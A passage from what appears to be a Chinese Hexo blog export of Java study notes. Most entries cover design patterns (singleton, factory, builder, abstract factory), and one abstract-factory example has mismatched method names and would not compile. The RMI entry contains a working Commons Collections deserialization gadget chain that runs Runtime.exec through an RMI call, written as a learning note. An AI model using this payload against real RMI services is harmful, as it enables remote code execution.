<p>双重检查可以确保在多线程环境下也能保持单例的唯一性，同时尽可能地减少了同步的开销。</p>
<h3 id="JAVA特有的写法"><a href="#JAVA特有的写法" class="headerlink" title="JAVA特有的写法"></a>JAVA特有的写法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SingletonHolder</span> &#123;  <span class="comment">//由静态内部类持有单例对象，根据类加载的特性，仅使用Singleton类时，不会对静态内部类进行初始化</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Singleton</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123; <span class="comment">//只有真正使用内部类时，才会进行类初始化</span></span><br><span class="line">        <span class="keyword">return</span> SingletonHolder.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Java中，静态内部类在被使用之前是不会被初始化的，这是由类加载器的工作原理决定的。</p>
<p>当程序第一次访问静态内部类 <code>SingletonHolder</code> 时，JVM 会加载 <code>SingletonHolder</code> 类。这个加载过程是延迟的，只有在真正需要使用 <code>SingletonHolder</code> 类时才会触发。所以，即使 <code>Singleton</code> 类被加载了，但是不会导致 <code>SingletonHolder</code> 类被加载，也就不会创建单例对象。</p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>创建型-工厂模式</title>
    <url>/2024/05/03/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​	为了写出更“优雅”的代码，遂准备来学习JAVA的设计模式。</p>
<p>​	以前从来没有写文章的习惯，发现学过的东西容易忘记，也可能是学的过于表面，不够深入，了解了费曼学习法，决定开始码文章，当作学习记录吧，也方便回顾。</p>
<h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><p>​	JAVA的设计模式分为三类，创建型模式（关注对象的创建机制）、结构性模式（关注类和对象之间的组合）、行为型模式（关注对象之间的通信以及责任的分配）</p>
<h2 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Fruit</span> &#123; <span class="comment">//水果抽象类</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">Fruit</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name +<span class="string">&quot;@&quot;</span>+hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Apple</span> <span class="keyword">extends</span> <span class="title class_">Fruit</span> &#123; <span class="comment">//继承水果</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Apple</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(<span class="string">&quot;苹果&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Orange</span> <span class="keyword">extends</span> <span class="title class_">Fruit</span> &#123;	<span class="comment">//继承水果</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Orange</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;橘子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimplefruitFactory</span> &#123; <span class="comment">//水果工厂</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Fruit <span class="title function_">getFruit</span><span class="params">(String type)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;苹果&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Apple</span>();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;橘子&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Orange</span>();</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 处理未知类型</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> SimplefruitFactory.getFruit(<span class="string">&quot;橘子&quot;</span>); <span class="comment">//通过工厂创建</span></span><br><span class="line">        System.out.println(fruit);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	这样做的好处是，比如Apple的构造方法需要新的参数，我们只需要修改工厂里面的参数，因为其他地方是通过工厂获得的水果的实例。</p>
<p>假如现在需要增加一个新的水果类型，就需要对工厂进行修改。这不符合开闭原则。（开闭原则：一个软件实体，比如类、模块和函数应该对扩展开放，对修改关闭）。</p>
<h2 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">FruitFactory</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Fruit</span>&gt;&#123; <span class="comment">//将水果工厂抽象为抽象类，通过泛型指定水果类型</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> T <span class="title function_">getFruit</span><span class="params">()</span>;  <span class="comment">//不同的水果工厂，生产不同的水果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppleFactora</span> <span class="keyword">extends</span> <span class="title class_">FruitFactory</span>&lt;Apple&gt;&#123; <span class="comment">//假如需要苹果就创建一个苹果工厂类，新增橘子，蓝莓，等等同理</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Apple <span class="title function_">getFruit</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Apple</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Apple</span> <span class="variable">fruit</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AppleFactora</span>().getFruit();</span><br><span class="line">        System.out.println(fruit);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​	屏蔽了对象的创建细节，使用者只需要关心如何使用对象，降低了客户端与对象之间的耦合度。</p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>创建型-建造者模式</title>
    <url>/2024/05/08/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    String name;</span><br><span class="line">    String gender; </span><br><span class="line">    String profession;</span><br><span class="line">    List&lt;String&gt; awards;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(<span class="type">int</span> id, <span class="type">int</span> age, String name, String gender, String profession, List&lt;String&gt; awards)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.gender = gender; </span><br><span class="line">        <span class="built_in">this</span>.profession = profession;</span><br><span class="line">        <span class="built_in">this</span>.awards = awards;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>学生类的属性非常多，导致构造函数，也非常多，如果我们通过new的方式创建很容易填错参数位置。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;String&gt; awards = Arrays.asList(<span class="string">&quot;LPL 春季赛冠军&quot;</span>,<span class="string">&quot;上海Major冠军&quot;</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">1</span>, <span class="number">18</span>, <span class="string">&quot;小明&quot;</span>, <span class="string">&quot;男&quot;</span>, <span class="string">&quot;计算机科学与技术&quot;</span>, awards);</span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="建造者模式"><a href="#建造者模式" class="headerlink" title="建造者模式"></a>建造者模式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    String name;</span><br><span class="line">    String gender; </span><br><span class="line">    String profession;</span><br><span class="line">    List&lt;String&gt; awards;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Student</span><span class="params">(<span class="type">int</span> id, <span class="type">int</span> age, String name, String gender, String profession, List&lt;String&gt; awards)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.gender = gender; </span><br><span class="line">        <span class="built_in">this</span>.profession = profession;</span><br><span class="line">        <span class="built_in">this</span>.awards = awards;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> StudentBuilder <span class="title function_">builder</span><span class="params">()</span> &#123;  <span class="comment">//通过builder直接获取建造者</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StudentBuilder</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StudentBuilder</span> &#123;</span><br><span class="line">        <span class="type">int</span> id;</span><br><span class="line">        <span class="type">int</span> age;</span><br><span class="line">        String name;</span><br><span class="line">        String gender;</span><br><span class="line">        String profession;</span><br><span class="line">        List&lt;String&gt; awards;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> StudentBuilder <span class="title function_">id</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.id = id;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> StudentBuilder <span class="title function_">age</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> StudentBuilder <span class="title function_">name</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> StudentBuilder <span class="title function_">gender</span><span class="params">(String gender)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.gender = gender;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> StudentBuilder <span class="title function_">profession</span><span class="params">(String profession)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.profession = profession;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> StudentBuilder <span class="title function_">awards</span><span class="params">(List&lt;String&gt; awards)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.awards = awards;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Student <span class="title function_">build</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Student</span>(id, age, name, gender, profession, awards);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Student.<span class="type">StudentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> Student.builder();</span><br><span class="line">        List&lt;String&gt; awards = Arrays.asList(<span class="string">&quot;LPL 春季赛冠军&quot;</span>, <span class="string">&quot;上海Major冠军&quot;</span>);</span><br><span class="line">        builder.id(<span class="number">1</span>).name(<span class="string">&quot;John Doe&quot;</span>).gender(<span class="string">&quot;Male&quot;</span>).awards(awards).profession(<span class="string">&quot;&quot;</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>建造者模式提供了一种清晰、灵活且易于维护的方式来构建对象，尤其适用于具有多个参数和复杂构建逻辑的情况。</strong></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>创建型-抽象工厂模式</title>
    <url>/2024/05/07/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​	工厂模式关注于创建单个对象，通过一个工厂类来实现。但是假如遇到需要创建一系列相关或相互依赖的对象的时候，就有些乏力了，而抽象工厂模式能很好的解决这个问题。</p>
<h2 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Fruit</span> &#123; <span class="comment">//水果抽象类</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">Fruit</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name +<span class="string">&quot;@&quot;</span>+hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Apple</span> <span class="keyword">extends</span> <span class="title class_">Fruit</span> &#123; <span class="comment">//水果实现类</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Apple</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(<span class="string">&quot;苹果&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Orange</span> <span class="keyword">extends</span> <span class="title class_">Fruit</span> &#123; <span class="comment">//水果实现类</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Orange</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;橘子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractFruitFactory</span> &#123;  <span class="comment">//抽象水果工厂</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> Fruit <span class="title function_">getApple</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> Fruit <span class="title function_">getOrange</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppleFactory</span> <span class="keyword">extends</span> <span class="title class_">AbstractFruitFactory</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Fruit <span class="title function_">createApple</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Apple</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Fruit <span class="title function_">createOrange</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 在苹果工厂中不创建橘子</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrangeFactory</span> <span class="keyword">extends</span> <span class="title class_">AbstractFruitFactory</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Fruit <span class="title function_">createApple</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 在橘子工厂中不创建苹果</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Fruit <span class="title function_">createOrange</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Orange</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">AbstractFruitFactory</span> <span class="variable">appleFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AppleFactory</span>();</span><br><span class="line">        <span class="type">Fruit</span> <span class="variable">apple</span> <span class="operator">=</span> appleFactory.createApple();</span><br><span class="line">        System.out.println(apple);</span><br><span class="line"></span><br><span class="line">        <span class="type">AbstractFruitFactory</span> <span class="variable">orangeFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OrangeFactory</span>();</span><br><span class="line">        <span class="type">Fruit</span> <span class="variable">orange</span> <span class="operator">=</span> orangeFactory.createOrange();</span><br><span class="line">        System.out.println(orange);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="工厂模式和抽象工厂模式的区别"><a href="#工厂模式和抽象工厂模式的区别" class="headerlink" title="工厂模式和抽象工厂模式的区别"></a>工厂模式和抽象工厂模式的区别</h2><p>​	<strong>工厂模式关注于创建单个对象，通常是通过一个工厂类来实现。</strong></p>
<p>​	<strong>工厂模式适用于创建单个对象的场景，抽象工厂模式适用于需要创建一系列相关对象的场景。</strong></p>
<p>​	<strong>抽象工厂模式则更加封闭，因为它需要一次性定义所有产品族的创建方法。</strong></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>RMI漏洞利用</title>
    <url>/2024/05/21/JAVA%E5%AE%89%E5%85%A8/RMI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>强烈建议大家在学习之前先去b站看组长的视频了解rmi的通信原理。</p>
<p><a href="https://www.bilibili.com/video/BV1L3411a7ax/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化RMI专题-没有人比我更懂RMI</a></p>
<hr>
<p>RMI 作为后续漏洞中最为基本的利用手段之一，学习的必要性非常之大。对于初学者来说也会偏难，慢慢磨吧。雷军在一次演讲中说到:很多知识点没有绝对的先后顺序，看不懂的先跳过去。</p>
<p>个人感悟：确实很多东西你先过几遍，实在不懂就跳过去，慢慢就懂了，唯一需要的是坚持。</p>
<h2 id="攻击点总结"><a href="#攻击点总结" class="headerlink" title="攻击点总结"></a>攻击点总结</h2><p>在看完组长的视频之后对攻击点总结</p>
<p>一个远程对象的 <code>LiveRef</code> 在整个生命周期内是唯一的，保证了对象引用的一致性。</p>
<h2 id="服务端代码"><a href="#服务端代码" class="headerlink" title="服务端代码"></a>服务端代码</h2><p>添加Commons Collections</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line">        remoteObj.SayHello(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        remoteObj.SayGoodbye(getpayload());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;lala&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(java.lang.annotation.Retention.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1L3411a7ax/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化RMI专题-没有人比我更懂RMI</a></p>
<p><a href="https://su18.org/post/rmi-attack/">Java RMI 攻击由浅入深</a></p>
<p><a href="https://xz.aliyun.com/t/7930?time__1311=n4+xnD0G0=eQqiIPAKDsA3ExjxtvdiYDgiGYD&alichlgref=https://xz.aliyun.com/u/20851">针对RMI服务的九重攻击 - 上</a></p>
<p><a href="https://xz.aliyun.com/t/7932?time__1311=n4+xnD0G0=eQqiIpq05+b8DkGG8SdKt8DgiYD&alichlgref=https://xz.aliyun.com/u/20851">针对RMI服务的九重攻击 - 下</a></p>
<p><a href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">Java反序列化之RMI专题02-RMI的几种攻击方式</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA反序列化</title>
    <url>/2024/05/21/JAVA%E5%AE%89%E5%85%A8/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
